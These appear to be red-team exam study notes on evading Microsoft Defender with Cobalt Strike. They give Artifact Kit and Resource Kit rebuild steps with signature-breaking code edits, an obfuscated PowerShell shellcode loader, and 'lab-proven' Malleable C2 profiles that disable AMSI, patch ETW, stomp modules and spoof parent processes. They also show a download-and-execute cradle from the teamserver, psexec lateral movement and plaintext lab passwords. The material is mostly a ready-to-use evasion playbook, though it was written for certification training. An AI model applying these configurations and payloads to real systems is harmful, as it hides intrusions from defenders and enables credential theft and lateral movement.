# Defense Evasion

* Compiled Artifacts
* Script Artifacts
* Beacon Memory
* Beacon Command Behaviour
* Blending Post-Ex
* Command-Line Detections

---

## Named Pipe Reference — Two Separate Settings

> **Exam trap:** There are TWO different named pipe settings. They control completely different things.

| Pipe | Where configured | Lab default | Exam day |
|------|-----------------|-------------|----------|
| **SMB C2 comms** | CS Listener settings (GUI) | `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337` | **Create a CUSTOM name — never use TSVCPIPE-*** |
| **Fork&run output** | `post-ex.pipename` in Malleable C2 profile | `dotnet-diagnostic-#####, ########-####-####-####-############` | Use this value — OPSEC-safe |

### SMB Listener — Exam-Safe Pipename Patterns

```
# Good — blends with legitimate Windows named pipes:
wkssvc
ntsvcs-<random digits>
netlogon-<random digits>

# Bad — all CS defaults, all detected:
TSVCPIPE-*
msagent_*
postex_*
MSSE-*-server
```

### `post-ex.pipename` Wildcard Format

```
set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
# '#' = random digit substituted at runtime by CS
# Comma-separated = two candidate names, CS uses first available
# dotnet-diagnostic-* blends with .NET CLR runtime pipes present on any Windows/.NET system
```

---

## Build new artifacts    

```
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

### Parameter Reference

```
./build.sh <technique> <allocator> <magic_mz_x86> <magic_mz_x64> <rdll_x86> <rdll_x64> <stack_spoof> <output_dir>
```

| # | Parameter | Value in Example | Purpose |
|---|-----------|-----------------|---------|
| 1 | `technique` | `mailslot` | IPC method used to pass shellcode into the artifact. Options: `mailslot`, `pipe`, `readfile` |
| 2 | `allocator` | `VirtualAlloc` | Memory allocation method for shellcode. Options: `VirtualAlloc`, `MapViewOfFile`, `HeapAlloc` |
| 3 | `magic_mz_x86` | `351363` | Replaces the `MZ` (4D5A) DOS header magic bytes in x86 artifact — defeats static sig detection. Patched back at runtime |
| 4 | `magic_mz_x64` | `0` | Same as above for x64. `0` = use default (no substitution) |
| 5 | `rdll_x86` | `false` | Use Reflective DLL staging for x86 payload |
| 6 | `rdll_x64` | `false` | Use Reflective DLL staging for x64 payload |
| 7 | `stack_spoof` | `none` | Call stack spoofing. Options: `none` or a spoofing technique name |
| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Where compiled artifacts land — load this dir in CS via `Script Manager` / `artifact.cna` |

### Technique Options

| Technique | How it works | OPSEC |
|-----------|-------------|-------|
| `mailslot` | Shellcode passed via Windows mailslot IPC | Less commonly signatured |
| `pipe` | Named pipe IPC | Common — more detection rules |
| `readfile` | Reads shellcode from a temp file | OPSEC-CAUTION — writes to disk |

### Allocator Options

| Allocator | OPSEC note |
|-----------|-----------|
| `VirtualAlloc` | Most common — heavily monitored by EDR hooks |
| `MapViewOfFile` | File-backed mapping — less detected but still monitored |
| `HeapAlloc` | Heap-based — can evade RWX page detection |

### magic_mz Explained

Every Windows PE file starts with bytes `4D 5A` (hex) — ASCII **MZ** — at offset 0x00:

```
Offset 0x00:  4D 5A 90 00 03 00 ...
              ^^ ^^
              M  Z   ← Defender looks for this at byte 0
```

Defender and AV use this as a static signature — anything starting with `MZ` gets flagged as a PE and scrutinised. The `magic_mz` parameter replaces those bytes before the artifact is written to disk/memory:

```
351363 decimal = 0x055C03 hex → first two bytes: 03 5C

On disk: 03 5C ...  ← looks like garbage, not a PE → passes static scan
```

At runtime the artifact's own stub patches them back before execution:

```
03 5C ...  →  4D 5A ...  (MZ restored → valid PE loaded and executed)
```

| Stage | Bytes at offset 0 | What Defender sees |
|-------|-------------------|-------------------|
| On disk / initial scan | `03 5C` (custom value) | Not a PE — passes static scan |
| At runtime (self-patched) | `4D 5A` (MZ restored) | Executable running in memory |

`magic_mz_x64 = 0` means no substitution for x64 — real MZ header left intact. Use a non-zero value for both archs when Defender is active.

---

**tip:** `mailslot` + `HeapAlloc` + custom `magic_mz` values is the quietest combination. Avoid `readfile` (disk write) and `VirtualAlloc` with RWX pages (EDR hook bait).

After build, load the aggressor script:

```
Cobalt Strike → Script Manager → Load → <output_dir>/artifact.cna
```

## ThreatCheck  

```dos
ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe" 
```  

>Identified bits that is detected by Defender and a HEX offset provided.

## Ghidra  

```
ghidraRun.bat
```  

### Ghidra Steps:  

1. New Project  

<img src="/images/ghidra01.png" width=600>  

2. Import File  

<img src="/images/ghidra02.png" width=400>  

3. Double Click to open imported file

<img src="/images/ghidra03.png" width=400>  

4. Analyze the file, yes all. Use offset provided by ***ThreatCheck*** and copy to Navigation Menu - Go to ...  

```
file(0x9CF)
```  

<img src="/images/ghidra04.png" width=600>  

5. See the reversed code decompiled on right window that is detected by Defender Antivirus.  

<img src="/images/ghidra05.png" width=800>  

6. Back to output from ***ThreatCheck***, copy last row of HEX bytes. In Ghidra open `Search Menu - Memory`. Then paste HEX bytes and click found memory location to take us to detected bit.  

<img src="/images/ghidra06.png" width=700> 

7. The function in this case for loop is confirmed to be location detected by antivirus. Using this identified function we go into our source code.

<img src="/images/ghidra07.png" width=600> 

8. Open Visual Code. In menu Edit - Find in Files, type string to search for above identified function.  

<img src="/images/ghidra08.png" width=600> 

9. Replace the identified function loop or piece of code with alternative approach to bypass defender detection. Example a backwards while loop.  

>Now repeat above by start with building new set of artifacts templates, and running ***ThreatCheck*** again.    
>Repeat until ***ThreatCheck*** shows no threat found.  

## Script Artifacts Kit  

>Building a new set of resources, without changing anything  

```
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```  

>Scanning template with ThreatCheck's AMSI engine  

```ps1
.\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

>Based on ThreatCheck output, simple String concatenation attempt in source code change.  

```ps1
('Syst'+'em.dll')
```  

>ThreatCheck next detection, shows marshal.copy method flagged and replace with native write process memory API.  

```ps1
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```  

>ThreatCheck misses different parts of code evaluation, use ***obfuscation***  
>[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)  

>Set the script block to be that of `compress.ps1` content.  

```
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```  

>token obfuscations result output:  

```
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```  

>Overwrite the content in `compress.ps1`, save the changes, then host and test a new payload.  

## Beacon Memory

Each payload artifact (`.exe`, `.dll`, `.ps1`) injects Beacon shellcode — a loader + DLL package. AV products perform memory scans post-execution. Detections carry the `sms` postfix in Defender alerts (memory scan indicator).

### RWX Memory — Remove the Red Flag

Default: Beacon allocates a single `PAGE_EXECUTE_READWRITE` (RWX) region. Native apps don't use RWX (exception: PS/.NET) — it's a red flag.

```
stage {
    set userwx "false";
    # Allocates RW → copies Beacon → sets per-section perms:
    # .text = RX | .rdata = R | .data = RW
}
```

### DLL Headers — Remove PE Fingerprint

Default: PE headers (DOS + NT headers) loaded into memory. Not needed at runtime — their presence fingerprints a PE in memory.

```
stage {
    set copyheaders "false";   # Only .text and .data sections remain
}
```

### Module Stomping — Back Beacon with a Legit Module

Problem: Beacon memory region has no backing module on disk → anomaly visible in System Informer's "use" column.

Fix: Map a legit DLL from disk, overwrite with Beacon → appears backed by a legitimate module.

```
stage {
    set module_x64 "Hydrogen.dll";   # Must be ≥ 512KB to fit Beacon
    set module_x86 "Hydrogen.dll";
}
```

Pick from `C:\Windows\System32\` — find a DLL ≥ 512KB. Most of the original PE remains; Beacon is mapped over the sections.

### String Replacement — Strip Detectable Beacon Strings

Export raw Beacon DLL via Aggressor to find signatured strings:

```javascript
// beacon.cna — dump raw DLL via BEACON_RDLL_GENERATE hook
on BEACON_RDLL_GENERATE {
    local('$handle');
    $handle = openf(">beacon_raw.x64.dll");
    writeb($handle, $2);
    closef($handle);
}
```

```bash
# In WSL — dump strings
strings beacon_raw.x64.dll | less
```

Replace in Malleable C2 stage block:

```
stage {
    transform-x64 {
        strrep "original string" "replacement";   # New string must be ≤ original length
        # Raw bytes:
        strrep "\x4d\x5a" "\x4e\x5b";
    }
    transform-x86 {
        # Same as x64
    }
}
```

> **WARNING:** Do NOT replace strings used by Beacon's internal web server. These support `powershell-import` / `powerpick` / `psinject` workflows. Breaking HTTP compliance silently breaks post-ex commands.

### Recommended `stage` Block (Exam Template)

```
stage {
    set userwx      "false";
    set copyheaders "false";
    set obfuscate   "true";
    set cleanup     "true";
    set module_x64  "Hydrogen.dll";
    set module_x86  "Hydrogen.dll";
    transform-x64 {
        # Add strrep entries after strings analysis
    }
}
```

---

## Beacon Command Behaviour — OPSEC Classes

### Command Classes

| Class | How It Works | OPSEC |
|-------|-------------|-------|
| **Housekeeping** | Client-side or simple beacon task | Minimal |
| **API-only** | Native Windows APIs in beacon thread | SAFE — no new process |
| **Inline (BOF)** | Compiled C runs in beacon thread, cleared after | SAFE — no new thread |
| **Fork & Run (spawn)** | New sacrificial process → inject shellcode → named pipe output | CAUTION — new proc + thread + pipe |
| **Fork & Run (explicit)** | Inject into existing process | CAUTION — new thread + pipe |
| **Process execution** | Runs arbitrary process on disk | UNSAFE — child process visible |
| **Service creation** | Creates Windows service | UNSAFE — Event 7045 |

### API-Only (OPSEC-SAFE)
```
pwd  cd  ls  download  upload  getuid  make_token
steal_token  rev2self  kill  exit
```

### BOF / Inline (OPSEC-SAFE — runs in beacon thread, no new thread)
```
clipboard  getsystem  kerberos_ticket_use  reg  runasadmin uac-cmstplua
jump psexec (BOF component)
```

> BOF memory allocation/cleanup controlled by `process-inject` block in Malleable C2.

### Fork & Run — Spawn Only (OPSEC-CAUTION)
```
execute-assembly    # .NET assembly in memory via sacrificial process
powerpick           # Unmanaged PowerShell — no powershell.exe, but spawns spawnto proc
```

### Fork & Run — Explicit Only (OPSEC-CAUTION)
```
psinject            # powerpick into a specified existing process
```

### Fork & Run — Both Modes
```
portscan  keylogger  printscreen  desktop  mimikatz
```

### Process Execution (OPSEC-UNSAFE)
```
execute    # No output
run        # With output
runas      # Alternate credentials
runu       # Spoofed parent PID
shell      # Via cmd.exe
powershell # Via powershell.exe
```

### Service Creation (OPSEC-UNSAFE — Event 7045)
```
elevate svc-exe
jump psexec / psexec64 / psexec_psh
remote-exec psexec
```

> **Service spawnto note:** Service payloads always default to `rundll32`. `post-ex.spawnto` env vars don't resolve in SYSTEM context. Use `ak-settings` in Artifact Kit to set an explicit path instead.

### Malleable C2 — `process-inject` block
Controls how BOFs and fork&run shellcode is injected:

```
process-inject {
    set startrwx    "false";
    set userwx      "false";
    set min_alloc   "16700";
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x1000";
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
```

### Malleable C2 — `post-ex` block
Controls fork&run sacrificial process and post-ex DLL modifications:

```
post-ex {
    set amsi_disable  "true";
    set spawnto_x64   "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86   "%windir%\\syswow64\\dllhost.exe";
    set obfuscate     "true";
    set smartinject   "true";
    set thread_hint   "ntdll!RtlUserThreadStart+0x1000";
}
```

---

## Blending Post-Ex — PPID Spoofing & spawnto

### The Problem

Beacon inside `msedge.exe` spawning `cmd.exe` or `powershell.exe` as a child = immediately suspicious.

**Rule:** C2 profile `post-ex.spawnto` is a *default only*. Every command must be evaluated against the current beacon's host process context.

### PPID Spoofing — `shell` and `run`

```
beacon> ps                              # Find PID of desired parent (e.g. explorer.exe)
beacon> ppid <explorer PID>
beacon> shell whoami                    # Appears as child of explorer.exe
beacon> run net user
```

### spawnto Override — Fork & Run (`execute-assembly`, `powerpick`)

```
beacon> ppid <explorer PID>
beacon> spawnto x64 %windir%\sysnative\notepad.exe
beacon> execute-assembly Rubeus.exe kerberoast /nowrap
```

### Blending Guidelines

| Beacon host process | Appropriate ppid parent | Appropriate spawnto |
|--------------------|------------------------|---------------------|
| `msedge.exe` | `explorer.exe` | `msedge.exe` (another instance) or `dllhost.exe` |
| `outlook.exe` | `explorer.exe` | `dllhost.exe` / `msiexec.exe` |
| `svchost.exe` | `services.exe` | `svchost.exe` / `dllhost.exe` |

HTTP/S Beacon → run inside a process that legitimately makes outbound HTTP requests.

---

## Command-Line Detections (Kernel Callbacks)

### How Defender Blocks at Process Creation

```
Kernel: PsSetCreateProcessNotifyRoutineEx callback
Struct: PS_CREATE_NOTIFY_INFO
  → ImageFileName   (executable path)
  → CommandLine     (full command line — inspected for abuse patterns)
  → CreationStatus  (driver sets STATUS_ACCESS_DENIED to block)
```

Surfaces as **Access Denied** error in beacon output — not a named AV alert.

### Known Blocked Patterns

| Command | Internally runs | Blocked pattern |
|---------|----------------|----------------|
| `pth` | Mimikatz `sekurlsa::pth` | Named pipe impersonation + Mimikatz args |
| `uac-schtasks` (Elevate Kit) | `schtasks.exe /SilentCleanup` | SilentCleanup arg on schtasks.exe command line |

### Bypass Strategy

Cannot disable kernel callbacks without kernel code execution. **Find an alternative that achieves the same result without the flagged command line:**

| Blocked | Alternative |
|---------|------------|
| `schtasks.exe /SilentCleanup` | COM object or API that triggers the task directly |
| `pth` (Mimikatz CLI) | `Rubeus.exe createnetonly` + `ptt` for token impersonation |
| Direct LSASS dump CLI tools | `nanodump` BOF (in-process, no command-line artifact) |

---

## ETW + AMSI Bypass — Run Together Before Heavy Post-Ex

Patch both before any `execute-assembly`, `powerpick`, or credential access work.

```cs
// Step 1 — Patch ETW in current beacon process (cuts EDR telemetry feed)
beacon> inline-execute etw_patch.o          // OPSEC-SAFE — BOF, runs in beacon thread

// Step 2 — AMSI handled automatically by post-ex block in Malleable C2 profile:
// post-ex { set amsi_disable "true"; }
// This disables AMSI in every fork & run sacrificial process (execute-assembly, powerpick)

// Step 3 — Confirm before running tools
beacon> powerpick $ExecutionContext.SessionState.LanguageMode
// FullLanguage = AMSI not blocking → safe to run assemblies
```

**When to run:**
```
After first beacon checks in → before any post-ex tool execution
After lateral move to new host → repeat ETW patch on new beacon
Before DCSync, Kerberoast, BloodHound collection
```

> ETW patch is per-process — does not persist across beacon migrations or new processes.

---

## Defence Evasion Workflow (Exam Day Order)

```
1. Build Artifact Kit
   → ./build.sh <technique> VirtualAlloc ... ./custom-artifacts
   → ThreatCheck.exe -f artifact64big.exe -e Defender
   → Fix signature in patch.c (recompile to different bytecode)
   → Repeat until clean
   → Load artifact.cna in CS Script Manager

2. Build Resource Kit
   → ./build.sh ./custom-resources
   → ThreatCheck.exe -f template.x64.ps1 -e AMSI -t Script
   → Fix PS1 (string concat, replace Marshal.Copy, obfuscate compress.ps1)
   → Load resources.cna in CS Script Manager

3. Malleable C2 Profile
   → stage { userwx=false, copyheaders=false, module_x64, obfuscate=true }
   → post-ex { amsi_disable=true, spawnto_x64=dllhost.exe }
   → process-inject { userwx=false, execute methods }
   → c2lint profile → fix errors

4. Test beacon in lab with Defender ON → confirm callback + survival

5. Per-command before execution:
   beacon> ppid <appropriate parent PID>
   beacon> spawnto x64 <contextually appropriate process>

6. Patch ETW before heavy post-ex:
   beacon> inline-execute etw_patch.o
```

---

## OPSEC Quick Reference

```
SAFE:    inline-execute (BOF) | API-only | steal_token | rev2self | powerpick
CAUTION: execute-assembly | portscan | mimikatz (fork&run) | dcsync
UNSAFE:  shell | powershell | run | runas | jump psexec | service creation
```

### Defender Signature Checklist

- [ ] Artifact templates clean (ThreatCheck — Defender engine)
- [ ] PS1 resource templates clean (ThreatCheck — AMSI engine)
- [ ] `stage.userwx false` — no RWX memory
- [ ] `stage.copyheaders false` — no PE headers in memory
- [ ] `stage.module_x64` set — memory backed by legit module
- [ ] Beacon DLL strings reviewed (`strings beacon_raw.x64.dll`)
- [ ] spawnto overridden from default `rundll32.exe`
- [ ] PPID spoofing configured before post-ex commands
- [ ] `c2lint` run against profile — zero errors

---

## LAB-PROVEN CONFIG — Exam Quick Reference

> Exact values from ZPS Defence Evasion lab. Verified working against Defender in Skillable environment.

### Team Server — Profile Location & Restart

```bash
ssh attacker@10.0.0.5          # Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile            # Edit profile here

# Restart team server (Docker)
sudo /usr/bin/docker restart cobaltstrike-cs-1

# Verify no profile errors
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

> **c2lint** before restarting — catch syntax errors without downtime.

---

### Malleable C2 — stage Block (Lab-Proven)

```
stage {
    set userwx         "false";
    set cleanup        "true";
    set copy_pe_header "false";
    set module_x64     "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```

> `strrep` replaces strings in the Beacon DLL before it's loaded. The raw-byte strrep flips a single byte (`\x00` → `\x01`) to break a known signature without breaking functionality.

---

### Malleable C2 — post-ex Block (Lab-Proven)

```
post-ex {
    set spawnto_x64  "%windir%\\sysnative\\werfault.exe";
    set cleanup      "true";
    set pipename     "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint  "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
```

**Key values:**
| Setting | Value | Why |
|---------|-------|-----|
| `spawnto_x64` | `werfault.exe` | Windows Error Reporting — legitimate, spawns frequently |
| `pipename` | `dotnet-diagnostic-*` | Blends with .NET diagnostic named pipes |
| `thread_hint` | `ntdll.dll!RtlUserThreadStart+0x2c` | Thread start disguised as legitimate ntdll location |
| `amsi_disable` | `true` | Disables AMSI in fork & run post-ex DLLs |

**`strrepex` syntax** (post-ex DLL string replacement — module-scoped):
```
strrepex "<Module>" "<original string>" "<replacement>";
# Module = "PowerPick" or "ExecuteAssembly" — targets specific post-ex DLL
# Replaces error strings that Defender signatures target in those DLLs
```

---

### Malleable C2 — process-inject Block (Lab-Proven)

```
process-inject {
    set allocator      "VirtualAllocEx";
    set bof_allocator  "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc      "8192";
    set startrwx       "false";
    set userwx         "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

**Key values:**
| Setting | Value | Why |
|---------|-------|-----|
| `allocator` | `VirtualAllocEx` | Remote process injection — standard but no RWX |
| `bof_allocator` | `VirtualAlloc` | BOF uses local alloc (no remote process) |
| `bof_reuse_memory` | `true` | Reuses previously allocated BOF memory — reduces alloc events |
| `startrwx` / `userwx` | `false` | No RWX memory at any stage |
| `execute` methods | 4 options listed | CS tries each in order until one succeeds |

---

### Artifact Kit — Exact Lab Steps

**1. Patch `patch.c` in VSCode**

```
File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```

**Line ~45** — svc.exe payload loop (replace):
```c
// OLD (signatured for loop):
// for ( int x = 0; x < length; x++ ) { ... }

// NEW (backwards while loop — different bytecode):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

**Line ~116** — normal .exe payload loop (replace):
```c
// OLD (signatured for loop):
// for ( int x = 0; x < length; x++ ) { ... }

// NEW:
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

> Comment out old code, don't delete — easy rollback if build breaks.

**2. Build in WSL**

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

# Run without args first to confirm minimum stage size for current CS release:
./build.sh

# Build with mailslot bypass:
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

Build output confirmation:
```
[Artifact Kit] [+] You have a x86_64 minge — I will recompile the artifacts
[Artifact Kit] [-] Using allocator: VirtualAlloc
[Artifact Kit] [-] Using STAGE size: 351363
[Artifact Kit] [+] The artifacts for the bypass technique 'mailslot' are saved in '...'
```

**3. Load into CS**

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

**4. ThreatCheck after build**

```cmd
ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
# Clean = no output. Detected = offset + hex bytes → go fix in patch.c → rebuild
```

---

### Resource Kit — Exact Lab Steps

**1. Build in WSL**

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

**2. Fix `template.x64.ps1` in VSCode**

```
File > Open Folder → C:\Tools\cobaltstrike\custom-resources
Open: template.x64.ps1
```

**Line 5** — break `System.dll` string signature:
```powershell
# Before:
.Equals('System.dll')
# After:
.Equals('Sys'+'tem.dll')
```

**Line 32** — replace `Marshal.Copy` with `WriteProcessMemory`:
```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll WriteProcessMemory),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

**3. Replace `compress.ps1`** with obfuscated version (Invoke-Obfuscation token obfuscation):

```powershell
# Obfuscated compress.ps1 — do NOT change %%DATA%% placeholder:
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

> `%%DATA%%` is the shellcode placeholder — CS patches shellcode into this slot. Never obfuscate or rename it.

**4. ThreatCheck AMSI scan**

```cmd
.\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
# Clean = "No threat found". Detected = fix the flagged line → re-scan
```

**5. Load into CS**

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-resources\resources.cna
```

---

### Service Payload spawnto — `ak-settings`

Service payloads (`jump psexec64`) always default to `rundll32.exe` as spawnto — env vars like `%windir%` don't resolve in SYSTEM context. Override with an explicit path via Artifact Kit:

```
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Then lateral move:
```
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> jump psexec64 lon-ws-1 smb
```

---

### Testing — Scripted Web Delivery

```
CS GUI: Attacks > Scripted Web Delivery
Select: http listener → Launch → copy URL
```

On target (Workstation — PowerShell):
```powershell
iex (new-object net.webclient).downloadstring("http://<teamserver>/payload_url")
```

New beacon checks in on attacker desktop → confirm `getuid`, check `ps` for Defender processes.

---

### Lab End-to-End Flow (Exam Day Order)

```
1. SSH to team server → edit /opt/cobaltstrike/profiles/default.profile
   → Add stage, post-ex, process-inject blocks (use lab-proven values above)
   → Save → docker restart cobaltstrike-cs-1 → check logs for errors

2. WSL on Windows dev box:
   → cd arsenal-kit/kits/artifact → patch patch.c (lines ~45, ~116)
   → ./build.sh mailslot VirtualAlloc 351363 0 false false none ./custom-artifacts
   → ThreatCheck on artifact64big.exe → fix if detected → rebuild

3. WSL on Windows dev box:
   → cd arsenal-kit/kits/resource → ./build.sh ./custom-resources
   → VSCode: fix template.x64.ps1 (line 5 + line 32) → replace compress.ps1
   → ThreatCheck -e AMSI on template.x64.ps1 → fix if detected

4. CS Script Manager → load artifact.cna, then resources.cna

5. Test: Scripted Web Delivery → iex downloadstring on target → beacon checkin

6. Before lateral with psexec:
   beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
   beacon> make_token DOMAIN\user <password>
   beacon> jump psexec64 <target> smb

7. Before any fork & run:
   beacon> ppid <explorer.exe PID>
   beacon> spawnto x64 %windir%\sysnative\werfault.exe
```
